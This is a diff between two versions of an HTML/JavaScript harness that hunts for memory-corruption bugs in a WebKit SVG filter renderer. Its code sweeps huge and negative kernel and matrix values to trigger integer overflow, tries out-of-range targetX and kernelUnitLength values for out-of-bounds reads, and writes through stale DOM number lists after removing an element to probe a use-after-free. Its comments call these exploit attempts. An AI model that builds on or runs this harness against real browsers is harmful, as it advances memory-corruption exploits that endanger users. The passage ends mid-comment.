@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v31</title>
+<title>SVG UAF v32</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -17,20 +17,22 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v31 - feConvolveMatrix neg kernel + feColorMatrix matrix sweep</h2>
+<h2>SVG UAF v32 - UAF feed verify + type-swap vector mismatch + MXS narrow + combined</h2>
 <div class="sub">
-  v30: kernel=-1e38 -> 255 (expected 0). matrix-1e38 -> R=0 (expected 255).
-  v31: 1) CNK binary-search neg kernel flip point + mixed +/-1e38 accumulator
-       2) MXS feColorMatrix[0,0] power-of-10 sweep find exact 255->0 cutoff
-       3) CNV feConvolveMatrix 2D kernel with mixed large +/- values (accumulator wrap)
-       4) UAF feColorMatrix: inject 1e38 into matrix values via DOM after remove
+  v31: UAF writeOk=true on SVGAnimatedNumberList but 1e38->[0,0] gives R=0.
+  MXS: alternating 0/255 at 1e3/1e4/1e5/1e6 — non-monotone = int overflow in rasterizer.
+  type-swap live-DOM gives 0,0,0 vs baked 25,150,63 — discrepancy to exploit.
+  v32: 1) UFV: UAF write baseVal[0]=2 -> confirm UAF feeds rasterizer (expect R=255)
+       2) TSV: type-swap vector size mismatch (20x 1e38 matrix, then switch to hueRotate)
+       3) MXN: narrow MXS flip points (binary search 1e3..1e4 and 1e5..1e6)
+       4) CMB: UAF write baseVal[0] = value from MXN flip point -> observe output
 </div>
 <svg id="livesvg" width="1" height="1" style="position:fixed;top:0;left:0;opacity:0.01;pointer-events:none"></svg>
 <div id="controls">
-  <button onclick="runCNK()">CNK neg-kernel</button>
-  <button onclick="runMXS()">MXS matrix-sweep</button>
-  <button onclick="runCNV()">CNV mixed-kernel-2D</button>
-  <button onclick="runUAF()">UAF colormatrix-uaf</button>
+  <button onclick="runUFV()">UFV uaf-feed-verify</button>
+  <button onclick="runTSV()">TSV type-swap-vector</button>
+  <button onclick="runMXN()">MXN mxs-narrow</button>
+  <button onclick="runCMB()">CMB combined</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -66,451 +68,43 @@ function dis(d) {
 }
 window.onerror = function(m, u, l, c, e) { log('[CRASH] ' + m + ' L' + l, 'bad'); return false; };
 
-// Read pixel from SVG string via canvas
-var _cnv = null;
-var _ctx = null;
+var _cnv = null; var _ctx = null;
 function getCanvas() {
   if (!_cnv) { _cnv = document.createElement('canvas'); _cnv.width = 200; _cnv.height = 200; _ctx = _cnv.getContext('2d'); }
   return { cnv: _cnv, ctx: _ctx };
 }
 
-async function svgPixel(svgStr, x, y) {
-  var cc = getCanvas();
-  var blob = new Blob([svgStr], { type: 'image/svg+xml' });
-  var url = URL.createObjectURL(blob);
-  var img = new Image();
-  var result = await new Promise(function(resolve) {
-    img.onload = function() {
-      try {
-        cc.ctx.clearRect(0, 0, 200, 200);
-        cc.ctx.drawImage(img, 0, 0);
-        var p = cc.ctx.getImageData(x, y, 1, 1);
-        resolve([p.data[0], p.data[1], p.data[2], p.data[3]]);
-      } catch(e) { resolve(null); }
-    };
-    img.onerror = function() { resolve(null); };
-    img.src = url;
-    setTimeout(function() { resolve(null); }, 2000);
-  });
-  URL.revokeObjectURL(url);
-  return result;
-}
-
-function makeConvolve(kernel, order, divisor) {
-  var divAttr = (divisor !== undefined) ? ' divisor="' + divisor + '"' : '';
-  // Input rect: 200x200 SVG, rect at (50,50) 100x100 fill rgb(200,100,50)
-  // Sample pixel at (100,100) = center of rect
-  return '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">' +
-    '<defs><filter id="f" color-interpolation-filters="sRGB" x="0" y="0" width="100%" height="100%">' +
-      '<feConvolveMatrix order="' + order + '" kernelMatrix="' + kernel + '"' + divAttr + '/>' +
-    '</filter></defs>' +
-    '<rect x="50" y="50" width="100" height="100" fill="rgb(200,100,50)" filter="url(#f)"/>' +
-  '</svg>';
-}
-
-function makeColorMatrix(type, values) {
-  return '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">' +
-    '<defs><filter id="f" color-interpolation-filters="sRGB">' +
-      '<feColorMatrix type="' + type + '" values="' + values + '"/>' +
-    '</filter></defs>' +
-    '<rect x="50" y="50" width="100" height="100" fill="rgb(200,100,50)" filter="url(#f)"/>' +
-  '</svg>';
-}
-
-/*
- * CNK: negative kernel binary search
- *
- * v30: kernel=-1e38 -> R=255 (expected 0).
- * kernel=1e38  -> R=255 (expected 255, correct via clamp).
- * So negative LARGE value clamps to 255 (not 0).
- *
- * Theory: WebKit's feConvolveMatrix uses float arithmetic.
- * result = sum(kernel[i] * pixel[i]) / divisor
- * = -1e38 * 0.784 / 1 = -7.84e37
- * clamp(-7.84e37) should = 0. But got 255.
- *
- * ALTERNATIVE THEORY: the result is computed as int32.
- * If computed as int32: int32(-7.84e37) on arm64.
- * On arm64, float->int for out-of-range values is UNDEFINED BEHAVIOR.
- * But typically: fcvtzs returns INT_MIN (0x80000000) for large negative.
- * INT_MIN = -2147483648. As unsigned: 2147483648.
- * Clamped to [0,255]: 255? No, -2147483648 < 0, so clamp to 0.
- * Unless the clamp is UNSIGNED: 2147483648 & 0xFF = 0. Hmm.
- *
- * ANOTHER THEORY: kernel is stored as float but applied at fixed16 scale.
- * fixed16: kernel=1e38 stored as fixed16 = saturate to max = 32767.
- * -1e38 stored as fixed16 = -32768.
- * result = -32768 * 200 / 32768 (normalize by kernel range) = -200.
- * Clamp to 0. Still not 255.
- *
- * ACTUAL TEST: sweep kernel from -1 to -1e38, find where output flips from 0 to 255.
- * Also test: does kernel=-0.001 give 0 or something else?
- */
-async function runCNK(q) {
-  if (!q) { dis(true); sep(); log('CNK: negative kernel sweep + mixed accumulator', 'inf'); sep(); }
-
-  // Phase 1: neg kernel sweep to find flip point
-  log('  phase1: neg kernel sweep, sample pixel at center of rect', 'inf');
-  // Expected: small neg kernel = small negative output -> clamp to 0.
-  // We expect R=0 for all neg kernels that just flip the channel.
-  // Find if there's a flip point where large neg -> 255.
-  var negKernels = [
-    '-0.001', '-0.01', '-0.1', '-1', '-10', '-100',
-    '-1e3', '-1e4', '-1e5', '-1e6', '-1e8', '-1e10',
-    '-1e12', '-1e15', '-1e18', '-1e20', '-1e25', '-1e30',
-    '-1e35', '-1e36', '-1e37', '-1e38'
-  ];
-
-  var baseR_pos = null;
-  // First: positive kernel=1 (passthrough) for reference
-  var ref = await svgPixel(makeConvolve('1', '1'), 100, 100);
-  if (ref) { baseR_pos = ref[0]; log('  ref (kernel=1): R=' + ref[0], 'inf'); }
-
-  var lastR = null;
-  for (var ni = 0; ni < negKernels.length; ni++) {
-    var k = negKernels[ni];
-    var px = await svgPixel(makeConvolve(k, '1'), 100, 100);
-    var R = px ? px[0] : -1;
-    var note = '';
-    if (R === 255) note = ' <- 255!! (expected 0 for neg)';
-    else if (R === 0) note = ' (clamped 0 as expected)';
-    else if (R > 0) note = ' <- PARTIAL: R=' + R;
-    if (lastR !== null && lastR === 0 && R === 255) note += ' [FLIP POINT]';
-    log('  kernel=' + k + ' R=' + R + note, R === 255 ? 'bad' : 'dim');
-    lastR = R;
-  }
-
-  // Phase 2: mixed kernel — half +1e38 half -1e38
-  // 1x1: trivial (already tested). Test 2x2 and 3x3 mixed.
-  log('  phase2: mixed +/-1e38 kernel (accumulator wrap test)', 'inf');
-  var mixed2x2 = [
-    { name: '+1e38,+1e38,-1e38,-1e38', k: '1e38 1e38 -1e38 -1e38', order: '2' },
-    { name: '+1e38,-1e38,+1e38,-1e38', k: '1e38 -1e38 1e38 -1e38', order: '2' },
-    { name: '0.5,-1e38,0.5,1e38',      k: '0.5 -1e38 0.5 1e38',    order: '2' },
-    // 3x3 where CENTER is -1e38 and corners are +1e38 (should cancel or overflow accumulator)
-    { name: '3x3 corners+1e38 center-1e38', k: '1e38 0 1e38 0 -1e38 0 1e38 0 1e38', order: '3' },
-    // 3x3 all +1e38 (accumulate 9 * 1e38 -> overflow)
-    { name: '3x3 all+1e38',            k: '1e38 1e38 1e38 1e38 1e38 1e38 1e38 1e38 1e38', order: '3' },
-    // 3x3 all -1e38 (accumulate 9 * -1e38)
-    { name: '3x3 all-1e38',            k: '-1e38 -1e38 -1e38 -1e38 -1e38 -1e38 -1e38 -1e38 -1e38', order: '3' },
-    // alternating: half pos half neg across 3x3
-    { name: '3x3 alt', k: '1e38 -1e38 1e38 -1e38 1e38 -1e38 1e38 -1e38 1e38', order: '3' },
-    // sum = 5*1e38 - 4*1e38 = 1e38 (net positive large)
-    { name: '3x3 more-pos', k: '1e38 -1e38 1e38 -1e38 1e38 1e38 1e38 -1e38 1e38', order: '3' }
-    // sum = 6*1e38 - 3*1e38 = 3e38
-  ];
-
-  for (var mi = 0; mi < mixed2x2.length; mi++) {
-    var mt = mixed2x2[mi];
-    var px2 = await svgPixel(makeConvolve(mt.k, mt.order), 100, 100);
-    var note2 = '';
-    if (px2) {
-      // Can't predict: just flag anything that isn't 0 or 255 as UNEXPECTED
-      var isUnexpected = (px2[0] > 0 && px2[0] < 255) || (px2[1] > 0 && px2[1] < 255) || (px2[2] > 0 && px2[2] < 255);
-      note2 = isUnexpected ? ' <- INTERMEDIATE: non-clamp value!' : '';
-    }
-    log('  ' + mt.name + ': px=' + (px2 ? px2.slice(0,3) : 'err') + note2,
-        note2.length > 0 ? 'bad' : 'dim');
-  }
-
-  if (!q) dis(false);
-}
-
-/*
- * MXS: feColorMatrix[0,0] power-of-10 sweep
- *
- * v30: matrix-1e38 (only [0,0]=1e38, rest identity) -> R=0 (expected 255).
- * The identity matrix with [0,0]=1e38 should produce R_out = clamp(1e38 * R_in) = 255.
- * But got R=0.
- *
- * Sweep [0,0] from 1 to 1e38. Find exact cutoff where R goes from 255 to 0.
- * Also: does it go 255 -> intermediate -> 0, or hard flip?
- *
- * Also test: what if [0,0]=1 but we have non-zero off-diagonal (cross-channel bleed)?
- * And: what if [0,4]=1e38 (bias term, the 5th column = constant addition)?
- * The bias term: R_out = ... + matrix[0,4]. With matrix[0,4]=1e38: clamp to 255. Boring.
- * UNLESS: bias term overflows differently than the main multiply.
- *
- * Also: diagonal all 1e38 (scale all channels by 1e38) — compare to per-channel.
- */
-async function runMXS(q) {
-  if (!q) { dis(true); sep(); log('MXS: feColorMatrix[0,0] sweep + off-diagonal + bias', 'inf'); sep(); }
-
-  // Identity matrix for reference
-  // "R_out G_out B_out A_out" = matrix * [R G B A 1]
-  // Identity: 1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0
-  var ID = '1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
-
-  log('  ref (identity): ', 'inf');
-  var refPx = await svgPixel(makeColorMatrix('matrix', ID), 100, 100);
-  log('  identity: px=' + (refPx ? refPx.slice(0,3) : 'err'), 'inf');
-
-  // Phase 1: sweep [0,0]
-  log('  phase1: sweep matrix[0,0] from 1 to 1e38', 'inf');
-  var vals = [1, 2, 10, 100, 1e3, 1e4, 1e5, 1e6, 1e8, 1e10, 1e12, 1e15, 1e18, 1e20, 1e25, 1e30, 1e35, 1e38];
-  var lastR_mxs = -1;
-  for (var vi = 0; vi < vals.length; vi++) {
-    var v = vals[vi];
-    var mat = v + ' 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
-    var px = await svgPixel(makeColorMatrix('matrix', mat), 100, 100);
-    var R = px ? px[0] : -1;
-    var note = '';
-    if (R === 255) note = ' (clamped max - correct)';
-    else if (R === 0) note = ' <- 0! (unexpected zero)';
-    else note = ' <- PARTIAL: R=' + R;
-    if (lastR_mxs === 255 && R !== 255) note += ' [FLIP POINT]';
-    log('  [0,0]=' + v.toExponential(1) + ' R=' + R + note, R === 0 ? 'bad' : (R === 255 ? 'ok' : 'inf'));
-    lastR_mxs = R;
-  }
-
-  // Phase 2: off-diagonal with 1e38 (cross-channel leak)
-  log('  phase2: off-diagonal elements = 1e38', 'inf');
-  var offDiag = [
-    { name: '[0,1]=1e38 (G->R)',   mat: '1 1e38 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0' },
-    { name: '[0,2]=1e38 (B->R)',   mat: '1 0 1e38 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0' },
-    { name: '[1,0]=1e38 (R->G)',   mat: '1 0 0 0 0  1e38 1 0 0 0  0 0 1 0 0  0 0 0 1 0' },
-    // Both [0,0] and [1,0] = 1e38 (double contribution to G output)
-    { name: '[0,0]+[1,0]=1e38',    mat: '1e38 0 0 0 0  1e38 1 0 0 0  0 0 1 0 0  0 0 0 1 0' },
-    // Bias terms [0,4]=[1,4]=[2,4]=1e38
-    { name: 'bias [0,4]=1e38',     mat: '1 0 0 0 1e38  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0' },
-    { name: 'all diag=1e38',       mat: '1e38 0 0 0 0  0 1e38 0 0 0  0 0 1e38 0 0  0 0 0 1e38 0' },
-    // Anti-diagonal (chain: R->G->B->R cross-coupling)
-    { name: 'chain R->G->B=1e38',  mat: '1 0 0 0 0  1e38 1 0 0 0  0 1e38 1 0 0  0 0 0 1 0' }
-  ];
-
-  for (var oi = 0; oi < offDiag.length; oi++) {
-    var od = offDiag[oi];
-    var px2 = await svgPixel(makeColorMatrix('matrix', od.mat), 100, 100);
-    var note2 = '';
-    if (px2) {
-      var R2 = px2[0]; var G2 = px2[1]; var B2 = px2[2];
-      // Check for non-clamp, non-zero intermediate values in any channel
-      var weird = [];
-      if (R2 > 0 && R2 < 255) weird.push('R=' + R2);
-      if (G2 > 0 && G2 < 255) weird.push('G=' + G2);
-      if (B2 > 0 && B2 < 255) weird.push('B=' + B2);
-      if (weird.length) note2 = ' <- INTERMEDIATE: ' + weird.join(',');
-    }
-    log('  ' + od.name + ': px=' + (px2 ? px2.slice(0,3) : 'err') + note2,
-        note2.length > 0 ? 'bad' : 'dim');
-  }
-
-  if (!q) dis(false);
-}
-
-/*
- * CNV: feConvolveMatrix 2D kernel with boundary pixel reads
- *
- * New angle: feConvolveMatrix 3x3 reads from NEIGHBORING pixels (kernel footprint).
- * Center pixel (100,100). Kernel reads (99..101, 99..101).
- * All those pixels are INSIDE the SVG (within rect or within SVG bounds).
- * But: with edgeMode="none" (default), pixels OUTSIDE the source region use 0.
- *
- * EXPLOIT ATTEMPT: large kernel on pixel at the EDGE of the source region.
- * If we place the rect at (0,0) 1x1 pixel, and read from kernel position (-1,-1):
- * that pixel is "outside" the source — feConvolveMatrix's edgeMode="none" uses 0.
- * BUT: if edgeMode="wrap" — it wraps around the source image buffer!
- * A 1x1 source image wrapping could read from offset -1 relative to the buffer start.
- * That's a legitimate OOB read on the IMAGE BUFFER — not clamped to 0, actually reads!
- *
- * More specifically: edgeMode="wrap" with a 3x3 kernel on a 1x1 source image.
- * Kernel reads from (-1,-1) to (+1,+1) relative to (0,0).
- * With wrap: (-1,-1) -> (0,0) mod (1,1) = (0,0) itself. So it wraps to itself.
- * On a 2x2 source: (-1,-1) -> (1,1) mod (2,2) = (1,1). Legitimate pixel.
- * On a 3x3: (-1,-1) -> (2,2) mod (3,3) = (2,2). Legitimate.
- *
- * So edgeMode="wrap" is always in-bounds (wraps within source rect). Safe.
- *
- * NEW ANGLE: targetX/targetY attributes.
- * feConvolveMatrix has targetX and targetY that shift the kernel application point.
- * Default: targetX = floor(orderX/2), targetY = floor(orderY/2).
- * These must satisfy: 0 <= targetX < orderX.
- * But what if we specify targetX = -1 or targetX = 1e38?
- * If WebKit doesn't clamp: a large targetX shifts the kernel so it reads from
- * a completely different location in the source buffer — potentially OOB.
- *
- * Also: kernelUnitLength with large values.
- * kernelUnitLength sets the step between adjacent kernel samples.
- * With kernelUnitLength="1e38 1": each kernel step moves 1e38 pixels horizontally.
- * The actual pixel coordinates become: x + (ki - targetX) * 1e38.
- * For ki=0, targetX=1, x=100: read from 100 + (0-1)*1e38 = 100 - 1e38 = -1e38.
- * That's a FLOAT coordinate — then clamped or OOB?
- */
-async function runCNV(q) {
-  if (!q) { dis(true); sep(); log('CNV: targetX/Y OOB + kernelUnitLength large + edgeMode', 'inf'); sep(); }
-
-  // Phase 1: targetX OOB values
-  log('  phase1: targetX with large/negative values', 'inf');
-
-  function makeConvolveTarget(order, kernel, tx, ty, edgeMode, kul) {
-    var txAttr = (tx !== undefined) ? ' targetX="' + tx + '"' : '';
-    var tyAttr = (ty !== undefined) ? ' targetY="' + ty + '"' : '';
-    var emAttr = edgeMode ? ' edgeMode="' + edgeMode + '"' : '';
-    var kulAttr = kul ? ' kernelUnitLength="' + kul + '"' : '';
-    return '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">' +
-      '<defs><filter id="f" color-interpolation-filters="sRGB" x="0" y="0" width="100%" height="100%">' +
-        '<feConvolveMatrix order="' + order + '" kernelMatrix="' + kernel + '"' +
-          txAttr + tyAttr + emAttr + kulAttr + '/>' +
-      '</filter></defs>' +
-      '<rect x="50" y="50" width="100" height="100" fill="rgb(200,100,50)" filter="url(#f)"/>' +
-    '</svg>';
-  }
-
-  var targetTests = [
-    // Normal: 3x3 kernel, targetX=1 (center, default)
-    { name: 'normal targetX=1 (default)', order: '3', k: '0 0 0 0 1 0 0 0 0', tx: 1, ty: 1 },
-    // targetX=0: shifts left — reads from (x-0, x-1, x-2) instead of (x-1, x, x+1)
-    { name: 'targetX=0', order: '3', k: '0 0 0 0 1 0 0 0 0', tx: 0, ty: 1 },
-    // targetX=2: shifts right — reads from (x-2, x-1, x)
-    { name: 'targetX=2 (edge of valid)', order: '3', k: '0 0 0 0 1 0 0 0 0', tx: 2, ty: 1 },
-    // INVALID: targetX=3 (must be < order=3, i.e. 0..2)
-    { name: 'targetX=3 (INVALID: >=order)', order: '3', k: '0 0 0 0 1 0 0 0 0', tx: 3, ty: 1 },
-    // targetX=100 (way out of range)
-    { name: 'targetX=100 (way OOB)', order: '3', k: '0 0 0 0 1 0 0 0 0', tx: 100, ty: 1 },
-    // targetX=-1 (negative)
-    { name: 'targetX=-1 (negative)', order: '3', k: '0 0 0 0 1 0 0 0 0', tx: -1, ty: 1 },
-    // targetX=2147483647 (INT_MAX)
-    { name: 'targetX=INT_MAX', order: '3', k: '0 0 0 0 1 0 0 0 0', tx: 2147483647, ty: 1 },
-    // With ACTUAL kernel values at center=1e38 and large targetX
-    { name: 'targetX=100 kernel-center=1e38', order: '3', k: '0 0 0 0 1e38 0 0 0 0', tx: 100, ty: 1 }
-  ];
-
-  for (var ti = 0; ti < targetTests.length; ti++) {
-    var tt = targetTests[ti];
-    var px = await svgPixel(makeConvolveTarget(tt.order, tt.k, tt.tx, tt.ty), 100, 100);
-    var R = px ? px[0] : -1;
-    var note = R > 0 && R < 255 ? ' <- INTERMEDIATE VALUE' :
-               R === 255 && tt.name.indexOf('neg') >= 0 ? ' <- unexpected 255' :
-               R === 255 && tt.name.indexOf('INT_MAX') >= 0 ? ' <- survived INT_MAX targetX!' :
-               '';
-    log('  ' + tt.name + ': R=' + R + note, note.length > 0 ? 'bad' : 'dim');
-  }
-
-  // Phase 2: kernelUnitLength with large values
-  log('  phase2: kernelUnitLength with large values (kernel step = OOB coordinates)', 'inf');
-  var kulTests = [
-    { name: 'kul=1 (normal)', kul: '1' },
-    { name: 'kul=10', kul: '10' },
-    { name: 'kul=100', kul: '100' },
-    { name: 'kul=1e6', kul: '1000000' },
-    { name: 'kul=1e10', kul: '1e10' },
-    { name: 'kul=1e20', kul: '1e20' },
-    { name: 'kul=1e38', kul: '1e38' },
-    { name: 'kul=0 (zero step)', kul: '0' },
-    { name: 'kul=-1 (neg step)', kul: '-1' },
-    { name: 'kul=1e38 1 (x huge, y normal)', kul: '1e38 1' }
-  ];
-
-  // 3x3 kernel identity (center=1, rest=0) — so only center pixel contributes
-  // but with large kernelUnitLength, the CENTER is at a different location
-  var k3id = '0 0 0 0 1 0 0 0 0';
-  for (var ki = 0; ki < kulTests.length; ki++) {
-    var kt = kulTests[ki];
-    var px2 = await svgPixel(makeConvolveTarget('3', k3id, 1, 1, undefined, kt.kul), 100, 100);
-    var R2 = px2 ? px2[0] : -1;
-    var note2 = R2 > 0 && R2 < 255 ? ' <- INTERMEDIATE' :
-                R2 === 0 && kt.name.indexOf('normal') >= 0 ? ' <- UNEXPECTED ZERO' :
-                '';
-    log('  ' + kt.name + ': R=' + R2 + note2, note2.length > 0 ? 'bad' : 'dim');
-  }
-
-  if (!q) dis(false);
-}
-
-/*
- * UAF: feColorMatrix values injected via DOM after remove
- *
- * Strategy: create feColorMatrix, set normal values, attach to live SVG.
- * Then: remove feColorMatrix from filter, try to write to its values via DOM.
- * Re-add and repaint.
- *
- * feColorMatrix.values is an SVGAnimatedNumberList (not SVGAnimatedLength/Number).
- * Different C++ class — check if it has the same UAF pattern.
- *
- * Also: try setting `values` attribute directly after remove.
- * setAttribute on a detached element — does WebKit allow this?
- * Then re-add. The attribute string would contain "1e38 ..." values.
- * WebKit re-parses the attribute on re-attach. Does it clamp at parse time?
- * Or does it write 1e38 directly into the filter's internal data?
- *
- * Also: try SVGAnimatedEnumeration (e.g. feColorMatrix.type).
- * Can we change the type from 'matrix' to 'hueRotate' AFTER remove and re-add?
- * If the type animatedVal is inconsistent with the stored values: undefined behavior.
- *
- * Also test: inject large values via CSS animation + SMIL.
- * <animate attributeName="values" from="identity" to="1e38-matrix" dur="0s" fill="freeze"/>
- * At dur=0s: immediately set to final value. Is the final value validated at parse time?
- */
-async function runUAF(q) {
-  if (!q) { dis(true); sep(); log('UAF: feColorMatrix DOM UAF + attribute inject + type swap', 'inf'); sep(); }
-
-  // Phase 1: SVGAnimatedNumberList UAF on feColorMatrix.values
-  log('  phase1: feColorMatrix.values UAF (remove + write + re-add)', 'inf');
-
+// Helper: build live SVG with feColorMatrix, read pixel at (100,100)
+// Returns the pixel AND the live DOM objects for further manipulation
+async function buildLiveFCM(matValues, targetFill) {
+  var fill = targetFill || 'rgb(200,100,50)';
   var outerSvg = document.createElementNS(SVG_NS, 'svg');
   outerSvg.setAttribute('width', '200'); outerSvg.setAttribute('height', '200');
   outerSvg.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
-
   var defs = document.createElementNS(SVG_NS, 'defs');
   var filter = document.createElementNS(SVG_NS, 'filter');
-  filter.setAttribute('id', 'uaf_f');
-  filter.setAttribute('color-interpolation-filters', 'sRGB');
-
+  filter.setAttribute('id', 'v32f'); filter.setAttribute('color-interpolation-filters', 'sRGB');
   var fcm = document.createElementNS(SVG_NS, 'feColorMatrix');
   fcm.setAttribute('type', 'matrix');
-  fcm.setAttribute('values', '1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
-  filter.appendChild(fcm);
-  defs.appendChild(filter);
-  outerSvg.appendChild(defs);
-
-  var target = document.createElementNS(SVG_NS, 'rect');
-  target.setAttribute('x', '50'); target.setAttribute('y', '50');
-  target.setAttribute('width', '100'); target.setAttribute('height', '100');
-  target.setAttribute('fill', 'rgb(200,100,50)');
-  target.setAttribute('filter', 'url(#uaf_f)');
-  outerSvg.appendChild(target);
+  fcm.setAttribute('values', matValues);
+  filter.appendChild(fcm); defs.appendChild(filter); outerSvg.appendChild(defs);
+  var rect = document.createElementNS(SVG_NS, 'rect');
+  rect.setAttribute('x', '50'); rect.setAttribute('y', '50');
+  rect.setAttribute('width', '100'); rect.setAttribute('height', '100');
+  rect.setAttribute('fill', fill);
+  rect.setAttribute('filter', 'url(#v32f)');
+  outerSvg.appendChild(rect);
   document.body.appendChild(outerSvg);
   await raf(); await raf();
+  return { svg: outerSvg, filter: filter, fcm: fcm, rect: rect };
+}
 
-  // Try to access values.baseVal[0]
-  var valsList = null;
-  var writeOk = false;
-  var wrote_val = 0;
-  try {
-    valsList = fcm.values;
-    log('  fcm.values exists: ' + (valsList !== null), 'inf');
-    log('  fcm.values.baseVal type: ' + (valsList && valsList.baseVal ? typeof valsList.baseVal : 'null'), 'inf');
-    if (valsList && valsList.baseVal && valsList.baseVal.length > 0) {
-      log('  fcm.values.baseVal.length: ' + valsList.baseVal.length, 'inf');
-      log('  fcm.values.baseVal[0].value: ' + valsList.baseVal[0].value, 'inf');
-    }
-  } catch(e) { log('  values access error: ' + e, 'bad'); }
-
-  // Remove and try UAF write
-  fcm.remove();
-  await raf();
-  try {
-    if (valsList && valsList.baseVal && valsList.baseVal.length > 0) {
-      var oldVal = valsList.baseVal[0].value;
-      valsList.baseVal[0].value = BIG;
-      wrote_val = valsList.baseVal[0].value;
-      writeOk = Math.abs(wrote_val - BIG) < BIG * 0.01;
-      log('  after remove: baseVal[0] write: old=' + oldVal + ' wrote=' + wrote_val + ' ok=' + writeOk, writeOk ? 'ok' : 'dim');
-    } else {
-      log('  no baseVal to write to', 'dim');
-    }
-  } catch(e) { log('  UAF write error: ' + e, 'bad'); }
-
-  filter.appendChild(fcm);
-  await raf(); await raf();
-  log('  re-added fcm to filter', 'inf');
-
-  // Serialize + readback
+async function readPixelFromLive(outerSvg) {
   var svgStr = new XMLSerializer().serializeToString(outerSvg);
   var blob = new Blob([svgStr], { type: 'image/svg+xml' });
   var url = URL.createObjectURL(blob);
   var img = new Image();
-  var uafPx = await new Promise(function(resolve) {
+  var result = await new Promise(function(resolve) {
     img.onload = function() {
       try {
         var cc = getCanvas();
@@ -525,133 +119,529 @@ async function runUAF(q) {
     setTimeout(function() { resolve(null); }, 2000);
   });
   URL.revokeObjectURL(url);
-  log('  canvas readback: px=' + (uafPx ? uafPx.slice(0,3) : 'err'), 'inf');
-  document.body.removeChild(outerSvg);
+  return result;
+}
 
-  // Phase 2: setAttribute with 1e38 values on DETACHED element then re-add
-  log('  phase2: setAttribute("values", "1e38 ...") on detached feColorMatrix', 'inf');
-  var outerSvg2 = document.createElementNS(SVG_NS, 'svg');
-  outerSvg2.setAttribute('width', '200'); outerSvg2.setAttribute('height', '200');
-  outerSvg2.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
-
-  var defs2 = document.createElementNS(SVG_NS, 'defs');
-  var filter2 = document.createElementNS(SVG_NS, 'filter');
-  filter2.setAttribute('id', 'uaf_f2');
-  filter2.setAttribute('color-interpolation-filters', 'sRGB');
-  var fcm2 = document.createElementNS(SVG_NS, 'feColorMatrix');
-  fcm2.setAttribute('type', 'matrix');
-  fcm2.setAttribute('values', '1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0');
-  filter2.appendChild(fcm2);
-  defs2.appendChild(filter2);
-  outerSvg2.appendChild(defs2);
-  var target2 = document.createElementNS(SVG_NS, 'rect');
-  target2.setAttribute('x', '50'); target2.setAttribute('y', '50');
-  target2.setAttribute('width', '100'); target2.setAttribute('height', '100');
-  target2.setAttribute('fill', 'rgb(200,100,50)');
-  target2.setAttribute('filter', 'url(#uaf_f2)');
-  outerSvg2.appendChild(target2);
-  document.body.appendChild(outerSvg2);
-  await raf();
-
-  // Remove, setAttribute, re-add
-  fcm2.remove();
-  await raf();
-  var bigMatStr = BIG + ' 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
-  try {
-    fcm2.setAttribute('values', bigMatStr);
-    log('  setAttribute on detached fcm2: ok', 'inf');
-    log('  getAttribute values (first 30): ' + (fcm2.getAttribute('values') || '').substring(0, 40), 'inf');
-  } catch(e2) { log('  setAttribute error: ' + e2, 'bad'); }
-  filter2.appendChild(fcm2);
-  await raf(); await raf();
-
-  var svgStr2 = new XMLSerializer().serializeToString(outerSvg2);
-  var blob2 = new Blob([svgStr2], { type: 'image/svg+xml' });
-  var url2 = URL.createObjectURL(blob2);
-  var img2 = new Image();
-  var attrPx = await new Promise(function(resolve) {
-    img2.onload = function() {
+async function svgPixelFromStr(svgStr) {
+  var blob = new Blob([svgStr], { type: 'image/svg+xml' });
+  var url = URL.createObjectURL(blob);
+  var img = new Image();
+  var result = await new Promise(function(resolve) {
+    img.onload = function() {
       try {
-        var cc2 = getCanvas();
-        cc2.ctx.clearRect(0, 0, 200, 200);
-        cc2.ctx.drawImage(img2, 0, 0);
-        var p2 = cc2.ctx.getImageData(100, 100, 1, 1);
-        resolve([p2.data[0], p2.data[1], p2.data[2], p2.data[3]]);
+        var cc = getCanvas();
+        cc.ctx.clearRect(0, 0, 200, 200);
+        cc.ctx.drawImage(img, 0, 0);
+        var p = cc.ctx.getImageData(100, 100, 1, 1);
+        resolve([p.data[0], p.data[1], p.data[2], p.data[3]]);
       } catch(e) { resolve(null); }
     };
-    img2.onerror = function() { resolve(null); };
-    img2.src = url2;
+    img.onerror = function() { resolve(null); };
+    img.src = url;
     setTimeout(function() { resolve(null); }, 2000);
   });
-  URL.revokeObjectURL(url2);
-  log('  setAttribute path canvas readback: px=' + (attrPx ? attrPx.slice(0,3) : 'err'), 'inf');
-  var note3 = '';
-  if (attrPx) {
-    if (attrPx[0] === 255) note3 = ' <- R=255 (1e38 * R clamped to 255, setAttribute accepted 1e38)';
-    else if (attrPx[0] === 0) note3 = ' <- R=0 (same as v30 matrix-1e38 bug — parse clamped to 0??)';
-    else if (attrPx[0] === 200) note3 = ' <- R=200 (passthrough — 1e38 string rejected, identity used)';
-    else note3 = ' <- UNEXPECTED R=' + attrPx[0];
+  URL.revokeObjectURL(url);
+  return result;
+}
+
+/*
+ * UFV: UAF feed verify
+ *
+ * v31: UAF write 1e38 to baseVal[0] -> canvas gives R=0.
+ * BUT we now know from MXS: matrix[0,0]=1e38 gives R=0 (integer overflow bug).
+ * So the UAF DOES work, just the rasterizer turns 1e38 to 0.
+ *
